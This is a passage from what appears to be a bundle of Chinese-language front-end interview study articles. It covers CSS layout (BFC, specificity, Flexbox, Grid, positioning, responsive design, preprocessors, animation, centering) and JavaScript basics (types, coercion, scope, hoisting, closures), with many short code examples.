\`\`\`

**场景三：防止与浮动元素重叠（两栏布局）**

\`\`\`css
.left {
  float: left;
  width: 200px;
}
.right {
  overflow: hidden; /* 触发 BFC，不会与浮动元素重叠 */
}
\`\`\`

### 2.5 BFC 面试题

**面试题：什么是 BFC？有什么作用？**

**标准回答**："BFC 是块级格式化上下文，是一个独立的渲染区域，内部元素的布局不会影响外部元素。触发 BFC 的方式包括：overflow 不为 visible、float 不为 none、position 为 absolute/fixed、display 为 flex/grid 等。BFC 的主要应用场景有三个：第一，解决 margin 合并问题；第二，清除浮动（父元素包含浮动子元素）；第三，实现自适应两栏布局（防止与浮动元素重叠）。"

---

## 三、CSS 选择器优先级与继承

### 3.1 选择器优先级计算

优先级由四个部分组成（a, b, c, d）：

| 选择器类型 | 优先级值 | 示例 |
|-----------|---------|------|
| !important | 最高优先级（∞） | \`color: red !important;\` |
| 内联样式 | (1, 0, 0, 0) | \`style="color: red"\` |
| ID 选择器 | (0, 1, 0, 0) | \`#header\` |
| 类选择器/属性选择器/伪类 | (0, 0, 1, 0) | \`.content\`, \`[type="text"]\`, \`:hover\` |
| 元素选择器/伪元素 | (0, 0, 0, 1) | \`div\`, \`p\`, \`::before\`, \`::after\` |
| 通配符选择器 | (0, 0, 0, 0) | \`*\` |

**计算规则**：
- 比较时从左到右，先比第一位，相等再比下一位
- 优先级相同的情况下，后面的样式覆盖前面的

\`\`\`css
/* 优先级计算示例 */
#nav .list li a:hover { }
/* ID: 1, Class: 1, Element: 2 → (0, 1, 1, 2) */

.nav .list .item a { }
/* ID: 0, Class: 3, Element: 1 → (0, 0, 3, 1) */

/* 第一个优先级更高，因为 ID 选择器的权重高于类选择器 */
\`\`\`

### 3.2 CSS 继承

**可继承的属性**：
- 字体属性：font-family, font-size, font-weight, font-style
- 文本属性：color, text-align, line-height, letter-spacing, word-spacing
- 列表属性：list-style
- 光标属性：cursor
- 可见性：visibility

**不可继承的属性**：
- 盒子模型属性：width, height, margin, padding, border
- 背景属性：background
- 定位属性：position, top, right, bottom, left
- 显示属性：display

**强制继承**：

\`\`\`css
.child {
  /* 强制继承父元素的 border 属性 */
  border: inherit;
}
\`\`\`

### 3.3 CSS 层叠顺序

当多个样式规则作用于同一个元素时，按以下顺序决定最终样式：

1. **重要性**：!important 声明
2. **来源**：作者样式 > 用户样式 > 浏览器默认样式
3. **优先级**：内联 > ID > 类/属性/伪类 > 元素/伪元素
4. **出现顺序**：后面的覆盖前面的

### 3.4 面试题：CSS 优先级是如何计算的？

**标准回答**："CSS 优先级通过四元组 (a, b, c, d) 来计算。a 代表内联样式，b 代表 ID 选择器数量，c 代表类选择器、属性选择器和伪类的数量，d 代表元素选择器和伪元素的数量。比较时从左到右，但需要注意这个权重不是十进制进位，而是各自独立比较。另外，!important 拥有最高优先级，但应尽量避免滥用，因为它会破坏样式表的可维护性。"

---

## 四、Flexbox 弹性布局

### 4.1 核心概念

Flexbox 布局由**弹性容器**（Flex Container）和**弹性项目**（Flex Items）组成。容器有主轴（main axis）和交叉轴（cross axis）。

### 4.2 容器属性（Flex Container）

\`\`\`css
.container {
  display: flex; /* 或 inline-flex */

  /* 主轴方向 */
  flex-direction: row | row-reverse | column | column-reverse;

  /* 主轴换行 */
  flex-wrap: nowrap | wrap | wrap-reverse;

  /* flex-direction 和 flex-wrap 的简写 */
  flex-flow: row nowrap;

  /* 主轴对齐方式 */
  justify-content: flex-start | flex-end | center | space-between | space-around | space-evenly;

  /* 交叉轴对齐方式（单行） */
  align-items: stretch | flex-start | flex-end | center | baseline;

  /* 多行对齐方式 */
  align-content: stretch | flex-start | flex-end | center | space-between | space-around;
}
\`\`\`

### 4.3 项目属性（Flex Items）

\`\`\`css
.item {
  /* 排列顺序（默认 0，越小越靠前） */
  order: 0;

  /* 放大比例（默认 0，不放大） */
  flex-grow: 0;

  /* 缩小比例（默认 1，自动缩小） */
  flex-shrink: 1;

  /* 初始大小（默认 auto） */
  flex-basis: auto;

  /* flex-grow、flex-shrink、flex-basis 的简写 */
  flex: 0 1 auto;
  /* 推荐简写：flex: 1 = flex: 1 1 0% */

  /* 单个项目的交叉轴对齐方式 */
  align-self: auto | flex-start | flex-end | center | baseline | stretch;
}
\`\`\`

### 4.4 justify-content 详解

| 值 | 效果 |
|----|------|
| flex-start | 项目靠主轴起点对齐 |
| flex-end | 项目靠主轴终点对齐 |
| center | 项目居中 |
| space-between | 两端对齐，项目之间间隔相等 |
| space-around | 每个项目两侧间隔相等（两端间隔是中间的一半） |
| space-evenly | 所有间隔完全相等（包括两端） |

### 4.5 flex 属性详解

\`\`\`css
/* flex: flex-grow flex-shrink flex-basis */

/* flex: 1 等同于 flex: 1 1 0% */
/* 元素会等分剩余空间 */
.item { flex: 1; }

/* flex: auto 等同于 flex: 1 1 auto */
/* 元素会等分剩余空间，但初始大小基于内容 */
.item { flex: auto; }

/* flex: none 等同于 flex: 0 0 auto */
/* 元素不会伸缩 */
.item { flex: none; }

/* flex: 0 等同于 flex: 0 1 0% */
/* 元素不会放大，但会缩小 */
.item { flex: 0; }
\`\`\`

### 4.6 常见 Flex 布局模式

**水平居中**：

\`\`\`css
.parent {
  display: flex;
  justify-content: center;
}
\`\`\`

**垂直居中**：

\`\`\`css
.parent {
  display: flex;
  align-items: center;
}
\`\`\`

**水平垂直居中**：

\`\`\`css
.parent {
  display: flex;
  justify-content: center;
  align-items: center;
}
\`\`\`

**等分布局**：

\`\`\`css
.parent {
  display: flex;
}
.child {
  flex: 1;
}
\`\`\`

**圣杯布局**：

\`\`\`css
.container {
  display: flex;
}
.left { width: 200px; }
.center { flex: 1; }
.right { width: 200px; }
\`\`\`

**粘性页脚**：

\`\`\`css
body {
  display: flex;
  flex-direction: column;
  min-height: 100vh;
}
main {
  flex: 1;
}
\`\`\`

---

## 五、Grid 网格布局

### 5.1 Grid vs Flexbox 对比

| 特性 | Grid | Flexbox |
|------|------|---------|
| 维度 | 二维布局（行和列） | 一维布局（行或列） |
| 适用场景 | 整体页面布局、复杂网格 | 组件内部布局、导航栏 |
| 对齐能力 | 同时控制行和列 | 只能控制主轴或交叉轴 |
| 学习曲线 | 较陡峭 | 较平缓 |
| 兼容性 | 现代浏览器均支持 | 现代浏览器均支持 |

### 5.2 容器属性

\`\`\`css
.container {
  display: grid;

  /* 定义列宽 */
  grid-template-columns: 200px 1fr 200px;
  /* 使用 repeat 函数 */
  grid-template-columns: repeat(3, 1fr);
  /* 使用 auto-fill 自动填充 */
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));

  /* 定义行高 */
  grid-template-rows: 100px auto 100px;

  /* 行和列的间距 */
  gap: 20px;
  /* 等同于 */
  row-gap: 20px;
  column-gap: 20px;

  /* 网格区域模板 */
  grid-template-areas:
    "header header header"
    "sidebar main main"
    "footer footer footer";

  /* 单元格内容的水平对齐 */
  justify-items: start | end | center | stretch;

  /* 单元格内容的垂直对齐 */
  align-items: start | end | center | stretch;

  /* 整个网格在容器中的水平对齐 */
  justify-content: start | end | center | stretch | space-between | space-around | space-evenly;

  /* 整个网格在容器中的垂直对齐 */
  align-content: start | end | center | stretch | space-between | space-around | space-evenly;

  /* 自动生成的行/列的大小 */
  grid-auto-rows: minmax(100px, auto);
  grid-auto-columns: 100px;

  /* 自动放置方式 */
  grid-auto-flow: row | column | row dense | column dense;
}
\`\`\`

### 5.3 项目属性

\`\`\`css
.item {
  /* 列的起始/结束位置 */
  grid-column-start: 1;
  grid-column-end: 3;
  /* 简写 */
  grid-column: 1 / 3;
  /* 或者使用 span */
  grid-column: 1 / span 2;

  /* 行的起始/结束位置 */
  grid-row-start: 1;
  grid-row-end: 3;
  /* 简写 */
  grid-row: 1 / 3;

  /* 指定网格区域 */
  grid-area: header;
  /* 或 grid-area: row-start / column-start / row-end / column-end */
  grid-area: 1 / 1 / 3 / 3;
}
\`\`\`

### 5.4 fr 单位详解

\`fr\`（fraction）是 Grid 中特有的弹性单位，表示可用空间的一份。

\`\`\`css
/* 1fr 1fr 1fr：三列等宽 */
.grid { grid-template-columns: 1fr 1fr 1fr; }

/* 1fr 2fr 1fr：中间列是两侧的两倍宽 */
.grid { grid-template-columns: 1fr 2fr 1fr; }

/* 和固定宽度混合使用 */
.grid { grid-template-columns: 200px 1fr 200px; }
\`\`\`

### 5.5 经典布局：Grid 实现圣杯布局

\`\`\`css
.container {
  display: grid;
  grid-template-areas:
    "header header header"
    "sidebar main aside"
    "footer footer footer";
  grid-template-columns: 200px 1fr 200px;
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
}

.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.aside { grid-area: aside; }
.footer { grid-area: footer; }
\`\`\`

---

## 六、CSS 定位

### 6.1 五种定位方式

| 定位方式 | 参照物 | 是否脱离文档流 | 使用场景 |
|---------|--------|--------------|---------|
| static | 无（默认值） | 否 | 正常文档流 |
| relative | 自身原来的位置 | 否（保留原位置） | 微调位置、为 absolute 提供参照 |
| absolute | 最近的非 static 祖先 | 是 | 弹出层、下拉菜单 |
| fixed | 浏览器视口 | 是 | 固定导航栏、悬浮按钮 |
| sticky | 最近的滚动祖先 | 否（达到阈值后变为固定） | 吸顶导航、表格表头 |

### 6.2 各定位方式详解

**relative（相对定位）**：
- 相对于自身原本的位置偏移
- 不脱离文档流，原来的位置保留
- 常用作 absolute 定位的参照容器

**absolute（绝对定位）**：
- 相对于最近的非 static 祖先定位
- 脱离文档流，不占据空间
- 如果所有祖先都是 static，则相对于 body 定位

**fixed（固定定位）**：
- 相对于浏览器视口定位
- 脱离文档流
- 不随滚动条滚动

**sticky（粘性定位）**：
- 相对定位和固定定位的混合
- 在阈值范围内是相对定位，超过阈值变为固定定位
- 需要指定 top/right/bottom/left 至少一个值

\`\`\`css
.sticky-header {
  position: sticky;
  top: 0;
  background: white;
  z-index: 100;
}
\`\`\`

### 6.3 层叠上下文（z-index）

**触发层叠上下文的常见条件**：
- position 为 relative/absolute/fixed 且 z-index 不为 auto
- opacity 小于 1
- transform 不为 none
- filter 不为 none
- flex/grid 容器的子元素且 z-index 不为 auto

**层叠顺序（从下到上）**：
1. 背景和边框
2. 负 z-index
3. 块级盒子
4. 浮动盒子
5. 内联盒子
6. z-index: 0
7. 正 z-index

---

## 七、响应式设计

### 7.1 媒体查询（Media Queries）

\`\`\`css
/* 基础语法 */
@media (max-width: 768px) {
  .container {
    flex-direction: column;
  }
}

/* 同时满足多个条件 */
@media (min-width: 768px) and (max-width: 1024px) {
  ...
}

/* 或条件 */
@media (max-width: 600px), (orientation: landscape) {
  ...
}

/* 针对打印 */
@media print {
  .no-print { display: none; }
}

/* 针对暗色模式 */
@media (prefers-color-scheme: dark) {
  body {
    background: #1a1a1a;
    color: #f0f0f0;
  }
}

/* 针对高分辨率屏幕 */
@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
  .logo {
    background-image: url('logo@2x.png');
  }
}
\`\`\`

### 7.2 移动端适配方案

**rem 适配方案**：

\`\`\`javascript
// 设置根字体大小
(function() {
  function setRem() {
    const designWidth = 375; // 设计稿宽度
    const clientWidth = document.documentElement.clientWidth;
    const fontSize = (clientWidth / designWidth) * 100;
    document.documentElement.style.fontSize = fontSize + 'px';
  }
  setRem();
  window.addEventListener('resize', setRem);
})();
\`\`\`

\`\`\`css
/* 使用方法：设计稿 20px = 0.2rem */
.title {
  font-size: 0.2rem; /* 设计稿 20px */
}
\`\`\`

**vw/vh 适配方案**：

\`\`\`css
/* vw：视口宽度的 1% */
/* vh：视口高度的 1% */
/* vmin：vw 和 vh 中较小的那个 */
/* vmax：vw 和 vh 中较大的那个 */

.container {
  width: 100vw;
  height: 100vh;
}

.title {
  font-size: 5.33vw; /* 20px / 375px * 100 = 5.33vw */
}
\`\`\`

### 7.3 响应式设计策略

**移动优先（Mobile First）**：

\`\`\`css
/* 基础样式：移动端 */
.container {
  padding: 10px;
}

/* 平板 */
@media (min-width: 768px) {
  .container {
    padding: 20px;
  }
}

/* 桌面 */
@media (min-width: 1024px) {
  .container {
    padding: 30px;
    max-width: 1200px;
    margin: 0 auto;
  }
}
\`\`\`

**桌面优先（Desktop First）**：

\`\`\`css
/* 基础样式：桌面端 */
.container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 30px;
}

/* 平板 */
@media (max-width: 1024px) {
  .container {
    padding: 20px;
  }
}

/* 移动端 */
@media (max-width: 768px) {
  .container {
    padding: 10px;
  }
}
\`\`\`

---

## 八、CSS 预处理器

### 8.1 Sass/SCSS 核心特性

**变量**：

\`\`\`scss
// 变量定义
\$primary-color: #1890ff;
\$font-size-base: 14px;
\$border-radius: 4px;

.button {
  color: \$primary-color;
  font-size: \$font-size-base;
  border-radius: \$border-radius;
}
\`\`\`

**嵌套**：

\`\`\`scss
.nav {
  display: flex;

  &-item {
    padding: 10px;
    &:hover {
      background: #f0f0f0;
    }
  }

  &.active {
    background: \$primary-color;
  }
}

// 编译后
// .nav { display: flex; }
// .nav-item { padding: 10px; }
// .nav-item:hover { background: #f0f0f0; }
// .nav.active { background: #1890ff; }
\`\`\`

**Mixin**：

\`\`\`scss
// 不带参数
@mixin clearfix {
  &::after {
    content: '';
    display: table;
    clear: both;
  }
}

// 带参数
@mixin ellipsis(\$lines: 1) {
  @if \$lines == 1 {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  } @else {
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: \$lines;
    overflow: hidden;
  }
}

// 使用
.container {
  @include clearfix;
}
.title {
  @include ellipsis(2);
}
\`\`\`

**函数**：

\`\`\`scss
@function px-to-rem(\$px, \$base: 16) {
  @return (\$px / \$base) * 1rem;
}

.title {
  font-size: px-to-rem(20); // 1.25rem
}
\`\`\`

**继承**：

\`\`\`scss
%message-shared {
  border: 1px solid #ccc;
  padding: 10px;
  color: #333;
}

.success {
  @extend %message-shared;
  border-color: green;
}

.error {
  @extend %message-shared;
  border-color: red;
}
\`\`\`

### 8.2 Less 核心特性

\`\`\`less
// 变量（使用 @）
@primary-color: #1890ff;

// 混合
.border-radius(@radius: 4px) {
  border-radius: @radius;
}

// 使用
.button {
  .border-radius(6px);
  color: @primary-color;
}
\`\`\`

---

## 九、CSS 动画 vs JavaScript 动画

### 9.1 CSS 动画

**Transition（过渡）**：

\`\`\`css
.box {
  width: 100px;
  height: 100px;
  background: blue;
  / transition: property duration timing-function delay; /
  transition: width 0.3s ease-in-out, background 0.3s ease;
}

.box:hover {
  width: 200px;
  background: red;
}
\`\`\`

**Animation（动画）**：

\`\`\`css
@keyframes slide-in {
  0% {
    transform: translateX(-100%);
    opacity: 0;
  }
  100% {
    transform: translateX(0);
    opacity: 1;
  }
}

.box {
  animation: slide-in 0.5s ease-out forwards;
}

/* 简写属性 */
/* animation: name duration timing-function delay iteration-count direction fill-mode play-state; */
.box {
  animation: slide-in 0.5s ease-out 0s 1 normal forwards;
}

/* 暂停动画 */
.box.paused {
  animation-play-state: paused;
}
\`\`\`

### 9.2 CSS 动画 vs JS 动画

| 对比维度 | CSS 动画 | JavaScript 动画 |
|---------|---------|---------------|
| 性能 | 浏览器优化（合成器线程），更好 | 需要手动控制，性能取决于实现 |
| 控制能力 | 有限（声明式） | 强大（命令式） |
| 复杂度 | 简单动画容易实现 | 复杂交互动画的首选 |
| GPU 加速 | transform 和 opacity 自动 GPU 加速 | 需要手动触发 GPU 加速 |
| 暂停/恢复 | animation-play-state | 完全控制 |
| 动态参数 | 不灵活 | 非常灵活 |
| 兼容性 | 现代浏览器全面支持 | 完全兼容 |

### 9.3 高性能动画原则

**只使用 transform 和 opacity**：

\`\`\`css
/* 高性能动画（不会触发 reflow） */
.good {
  transition: transform 0.3s, opacity 0.3s;
}
.good:hover {
  transform: scale(1.1);
  opacity: 0.8;
}

/* 低性能动画（会触发 reflow） */
.bad {
  transition: width 0.3s, height 0.3s, left 0.3s;
}
.bad:hover {
  width: 200px;
  height: 200px;
  left: 20px;
}
\`\`\`

**使用 will-change 提前告知浏览器**：

\`\`\`css
.animated-element {
  will-change: transform, opacity;
}
\`\`\`

**使用 requestAnimationFrame**：

\`\`\`javascript
function animate() {
  // 动画逻辑
  element.style.transform = \`translateX(\${position}px)\`;
  position += 1;

  if (position < targetPosition) {
    requestAnimationFrame(animate);
  }
}
requestAnimationFrame(animate);
\`\`\`

---

## 十、居中方式大全

### 10.1 水平居中

**方法一：text-align（行内/行内块元素）**

\`\`\`css
.parent { text-align: center; }
.child { display: inline-block; }
\`\`\`

**方法二：margin: 0 auto（块级元素）**

\`\`\`css
.child {
  width: 200px;
  margin: 0 auto;
}
\`\`\`

**方法三：Flexbox**

\`\`\`css
.parent {
  display: flex;
  justify-content: center;
}
\`\`\`

**方法四：绝对定位 + transform**

\`\`\`css
.parent { position: relative; }
.child {
  position: absolute;
  left: 50%;
  transform: translateX(-50%);
}
\`\`\`

### 10.2 垂直居中

**方法一：line-height（单行文本）**

\`\`\`css
.parent {
  height: 100px;
  line-height: 100px;
}
\`\`\`

**方法二：vertical-align（表格单元格）**

\`\`\`css
.parent {
  display: table-cell;
  vertical-align: middle;
}
\`\`\`

**方法三：Flexbox**

\`\`\`css
.parent {
  display: flex;
  align-items: center;
}
\`\`\`

**方法四：绝对定位 + transform**

\`\`\`css
.parent { position: relative; }
.child {
  position: absolute;
  top: 50%;
  transform: translateY(-50%);
}
\`\`\`

### 10.3 水平垂直居中（6 种方法）

**方法一：Flexbox（推荐）**

\`\`\`css
.parent {
  display: flex;
  justify-content: center;
  align-items: center;
}
\`\`\`

**方法二：Grid**

\`\`\`css
.parent {
  display: grid;
  place-items: center;
}
\`\`\`

**方法三：绝对定位 + transform**

\`\`\`css
.parent { position: relative; }
.child {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
\`\`\`

**方法四：绝对定位 + margin: auto**

\`\`\`css
.parent { position: relative; }
.child {
  position: absolute;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  margin: auto;
  width: 200px;
  height: 100px;
}
\`\`\`

**方法五：table-cell + vertical-align**

\`\`\`css
.parent {
  display: table-cell;
  text-align: center;
  vertical-align: middle;
}
.child {
  display: inline-block;
}
\`\`\`

**方法六：line-height + text-align（单行文本）**

\`\`\`css
.parent {
  height: 100px;
  line-height: 100px;
  text-align: center;
}
\`\`\`

---

## 十一、CSS 性能优化

### 11.1 选择器优化

\`\`\`css
/* 避免过深的选择器嵌套 */
.header .nav .nav-list .nav-item .nav-link { }
/* 改为 */
.nav-link { }

/* 避免通配符 */
* { margin: 0; padding: 0; }
/* 改为具体元素 */
body, div, p, h1, h2, h3 { margin: 0; padding: 0; }

/* 避免标签限定类选择器 */
div.content { }
/* 改为 */
.content { }
\`\`\`

### 11.2 渲染性能优化

- 使用 transform 和 opacity 做动画，避免触发 reflow
- 减少重排和重绘：批量修改样式，用 class 替代逐个修改 style
- 使用 will-change 提前告知浏览器
- 使用 contain 属性限制布局影响范围
- 使用 content-visibility: auto 延迟渲染不可见内容

\`\`\`css
.section {
  content-visibility: auto;
  contain-intrinsic-size: 0 500px; /* 预估高度 */
}
\`\`\`

### 11.3 文件优化

- 压缩 CSS 文件
- 合并 CSS 文件，减少 HTTP 请求
- 使用 CSS Sprite 合并小图标
- 关键 CSS 内联到 HTML 中
- 非关键 CSS 异步加载

\`\`\`html
<!-- 异步加载非关键 CSS -->
<link rel="preload" href="styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="styles.css"></noscript>
\`\`\`

---

## 十二、常见面试题

### 面试题 1：如何实现一个三角形？

\`\`\`css
.triangle {
  width: 0;
  height: 0;
  border-left: 50px solid transparent;
  border-right: 50px solid transparent;
  border-bottom: 100px solid red;
}
\`\`\`

### 面试题 2：什么是 BFC？如何触发？有哪些应用？

（参考第二节 BFC 部分）

### 面试题 3：Flex: 1 表示什么？

\`flex: 1\` 是 \`flex: 1 1 0%\` 的简写，表示：
- flex-grow: 1 — 当有剩余空间时，该元素会放大占据剩余空间
- flex-shrink: 1 — 当空间不足时，该元素会缩小
- flex-basis: 0% — 元素的初始大小为 0（完全由 flex-grow 分配空间）

### 面试题 4：如何实现 0.5px 的边框？

\`\`\`css
/* 方法一：transform scale */
.half-border {
  position: relative;
}
.half-border::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  height: 1px;
  background: #ccc;
  transform: scaleY(0.5);
  transform-origin: 0 0;
}

/* 方法二：使用 viewport 单位 */
@media (-webkit-min-device-pixel-ratio: 2) {
  .border {
    border: 0.5px solid #ccc;
  }
}
\`\`\`

### 面试题 5：什么是重绘和回流（重排）？

**回流（Reflow）**：当元素的尺寸、位置等几何属性发生变化时，浏览器需要重新计算布局，这个过程叫回流。回流一定会触发重绘。

**重绘（Repaint）**：当元素的外观（颜色、背景等）发生变化但不影响布局时，浏览器会重新绘制元素，这个过程叫重绘。

**触发回流的常见操作**：
- 修改元素的 width、height、margin、padding
- 修改元素的 position、top、left
- 修改字体大小
- 添加/删除 DOM 元素
- 浏览器窗口大小变化
- 读取 offsetWidth、offsetHeight、scrollTop 等属性

**优化建议**：使用 CSS class 批量修改样式，使用 DocumentFragment 批量操作 DOM，使用 transform 代替 top/left 做动画。

---

## 总结

CSS 面试的核心在于理解布局原理，而不是死记硬背属性。掌握盒模型、BFC、Flexbox/Grid、定位、响应式设计这五大核心概念，就足以应对绝大多数 CSS 面试题。同时，能够从性能角度思考 CSS 的编写方式，会让面试官对你刮目相看。

**核心记忆点**：
1. box-sizing: border-box 是现代项目的最佳实践
2. BFC 是解决 margin 合并、清除浮动、自适应布局的利器
3. Flexbox 适合一维布局，Grid 适合二维布局
4. 动画只用 transform 和 opacity 性能最佳
5. 居中方案首选 Flexbox 和 Grid
`
  },
  {
    id: "fe-js-basics",
    group: "基础能力",
    icon: "📜",
    title: "JavaScript 基础考点与面试技巧",
    content: `

# JavaScript 基础考点与面试技巧

## 一、数据类型

### 1.1 JavaScript 的 7 种原始类型

JavaScript 共有 7 种原始类型（Primitive Types）和 1 种引用类型（Object）：

| 类型 | 说明 | 示例 |
|------|------|------|
| undefined | 未定义 | \`let a;\` |
| null | 空值 | \`let a = null;\` |
| boolean | 布尔值 | \`true\`, \`false\` |
| number | 数字（64位浮点数） | \`42\`, \`3.14\`, \`NaN\`, \`Infinity\` |
| string | 字符串 | \`"hello"\`, \`'world'\` |
| symbol | 符号（ES6） | \`Symbol('id')\` |
| bigint | 大整数（ES2020） | \`9007199254740991n\` |
| object | 对象（引用类型） | \`{}\`, \`[]\`, \`function() {}\` |

### 1.2 typeof 操作符及其陷阱

\`\`\`javascript
// 原始类型
typeof undefined;   // "undefined"
typeof true;        // "boolean"
typeof 42;          // "number"
typeof "hello";     // "string"
typeof Symbol();    // "symbol"
typeof 123n;        // "bigint"

// 陷阱 1：null 返回 "object"（历史遗留 bug）
typeof null;        // "object" ← 注意！

// 陷阱 2：函数返回 "function"（但函数本质是对象）
typeof function(){}; // "function"

// 陷阱 3：数组返回 "object"
typeof [];          // "object"
typeof {};          // "object"

// 陷阱 4：NaN 的类型是 number
typeof NaN;         // "number"
\`\`\`

### 1.3 类型判断方法

\`\`\`javascript
// 判断 null
function isNull(value) {
  return value === null;
}

// 判断数组
Array.isArray([]);                    // true
Object.prototype.toString.call([]);    // "[object Array]"

// 判断所有类型（最准确的方法）
function getType(value) {
  if (value === null) return 'null';
  const type = typeof value;
  if (type !== 'object') return type;
  return Object.prototype.toString.call(value).slice(8, -1).toLowerCase();
}

getType({});          // "object"
getType([]);          // "array"
getType(new Date());  // "date"
getType(/regex/);     // "regexp"
getType(null);        // "null"
\`\`\`

### 1.4 原始类型与引用类型的区别

| 特性 | 原始类型 | 引用类型 |
|------|---------|----------|
| 存储位置 | 栈内存 | 堆内存（栈中存引用地址） |
| 赋值方式 | 值拷贝 | 引用拷贝（共享同一对象） |
| 可变性 | 不可变（immutable） | 可变 |
| 比较方式 | 比较值 | 比较引用地址 |

\`\`\`javascript
// 原始类型：值拷贝
let a = 10;
let b = a;
b = 20;
console.log(a); // 10（不受影响）

// 引用类型：引用拷贝
let obj1 = { name: '张三' };
let obj2 = obj1;
obj2.name = '李四';
console.log(obj1.name); // "李四"（受影响！）
\`\`\`

---

## 二、类型转换

### 2.1 显式类型转换

\`\`\`javascript
// 转字符串
String(123);        // "123"
(123).toString();   // "123"
123 + '';           // "123"（隐式转换）

// 转数字
Number('123');      // 123
parseInt('123px');  // 123
parseFloat('3.14'); // 3.14
+'123';             // 123（隐式转换）

// 转布尔
Boolean(1);         // true
!!1;                // true（隐式转换）
\`\`\`

### 2.2 隐式类型转换规则

**转字符串（+ 运算符中有字符串）**：

\`\`\`javascript
1 + '2';       // "12"
true + 'test'; // "truetest"
[] + '';       // ""
{} + '';       // 0（注意：{} 被当作代码块，+'' 是 0）
'' + {};       // "[object Object]"
\`\`\`

**转数字（算术运算符）**：

\`\`\`javascript
'5' - 2;       // 3
'5' * 2;       // 10
'5' / 2;       // 2.5
+'5';          // 5
+'';           // 0
+null;         // 0
+undefined;    // NaN
\`\`\`

**转布尔（条件判断）**：

\`\`\`javascript
// Falsy 值（共 8 个）
Boolean(false);     // false
Boolean(0);         // false
Boolean(-0);        // false
Boolean(0n);        // false
Boolean('');        // false
Boolean(null);      // false
Boolean(undefined); // false
Boolean(NaN);       // false

// 其他所有值都是 Truthy
Boolean([]);        // true
Boolean({});        // true
Boolean('0');       // true
Boolean('false');   // true
\`\`\`

### 2.3 == vs ===

\`==（宽松相等）\` 会进行类型转换，\`===（严格相等）\` 不会。

\`\`\`javascript
// == 的类型转换规则
null == undefined;           // true
null === undefined;          // false

0 == '';                     // true
0 == false;                  // true
'' == false;                 // true

'1' == 1;                    // true
'1' === 1;                   // false

// 对象比较时，== 和 === 行为一致（比较引用地址）
[] == [];                    // false
{} == {};                    // false

// 对象与原始类型比较：对象先转原始值
[1] == 1;                    // true（[1].toString() = "1" → 1 == 1）
[1,2] == '1,2';              // true
\`\`\`

**面试建议**：始终使用 \`===\`，除非明确知道需要类型转换（如 \`x == null\` 用于同时判断 null 和 undefined）。

### 2.4 经典面试题：[] == ![] 为什么是 true？

\`\`\`javascript
// 解析过程：
// 1. ![] → false（对象转布尔总是 true，取反为 false）
// 2. [] == false
// 3. 布尔值转数字：false → 0
// 4. [] == 0
// 5. 对象转原始值：[].valueOf() → []（不是原始值）
// 6. [].toString() → ""
// 7. "" == 0
// 8. 字符串转数字：Number("") → 0
// 9. 0 == 0 → true
\`\`\`

---

## 三、作用域链

### 3.1 三种作用域

\`\`\`javascript
// 全局作用域
var globalVar = 'global';

function test() {
  // 函数作用域
  var functionVar = 'function';

  if (true) {
    // 块级作用域（ES6）
    let blockVar = 'block';
    const blockConst = 'const';
  }
  console.log(blockVar); // ReferenceError
}
\`\`\`

### 3.2 作用域链

当查找一个变量时，JavaScript 引擎会先在当前作用域查找，如果找不到，会向上一级作用域查找，直到全局作用域。这个查找过程形成的链条就是**作用域链**。

\`\`\`javascript
let a = 'global';

function outer() {
  let a = 'outer';

  function inner() {
    let a = 'inner';
    console.log(a); // "inner"（先从自己的作用域找）
  }

  inner();
}

outer();
\`\`\`

### 3.3 词法作用域（静态作用域）

JavaScript 的作用域是**词法作用域**（静态作用域），即函数的作用域在函数定义时就已经确定，而不是在函数调用时。

\`\`\`javascript
let value = 1;

function foo() {
  console.log(value);
}

function bar() {
  let value = 2;
  foo(); // 输出 1，不是 2
  // 因为 foo 的作用域在定义时确定，而不是在 bar 中调用时
}

bar(); // 1
\`\`\`

---

## 四、变量提升（Hoisting）

### 4.1 var 的变量提升

\`\`\`javascript
console.log(a); // undefined（提升声明，但不提升赋值）
var a = 1;

// 以上代码等价于：
var a;
console.log(a);
a = 1;
\`\`\`

### 4.2 函数提升

\`\`\`javascript
// 函数声明：整体提升
foo(); // "hello"
function foo() {
  console.log('hello');
}

// 函数表达式：只提升变量声明，不提升赋值
bar(); // TypeError: bar is not a function
var bar = function() {
  console.log('hello');
};
\`\`\`

### 4.3 let 和 const 的暂时性死区（TDZ）

\`\`\`javascript
console.log(a); // ReferenceError: Cannot access 'a' before initialization
let a = 1;

// let 和 const 也存在提升，但提升后进入"暂时性死区"
// 在声明之前访问会报错，而不是返回 undefined
\`\`\`

### 4.4 提升优先级

\`\`\`javascript
// 函数声明优先级高于变量声明
console.log(foo); // [Function: foo]
var foo = 1;
function foo() {}

// 等价于：
function foo() {}
var foo; // 被忽略（因为 foo 已经是函数声明）
console.log(foo);
foo = 1;
\`\`\`

---

## 五、闭包（Closure）

### 5.1 什么是闭包

闭包是指一个函数能够访问其外部函数作用域中的变量，即使外部函数已经执行完毕。简单来说：**函数 + 函数能够访问的外部变量 = 闭包**。

### 5.2 闭包的形成条件

1. 函数嵌套
2. 内部函数引用外部函数的变量
3. 内部函数被返回或以其他方式被外部访问

\`\`\`javascript
function createCounter() {
  let count = 0; // 外部函数的变量

  return function() { // 内部函数
    count++; // 引用外部变量
    return count;
  };
}

const counter = createCounter();
console.log(counter()); // 1
console.log(counter()); // 2
console.log(counter()); // 3
// count 变量没有被销毁，因为内部函数仍然引用它
\`\`\`

### 5.3 闭包的实际应用

**1. 数据私有化（模块模式）**：

\`\`\`javascript
const Person = (function() {
  let name = ''; // 私有变量

  return {
    getName: function() {
      return name;
    },
    setName: function(newName) {
      name = newName;
    }
  };
})();

Person.setName('张三');
console.log(Person.getName()); // "张三"
console.log(Person.name);      // undefined（无法直接访问）
\`\`\`

**2. 函数柯里化**：

\`\`\`javascript
function add(x) {
  return function(y) {
    return x + y;
  };
}

const add5 = add(5);
console.log(add5(3)); // 8
console.log(add5(10)); // 15
\`\`\`

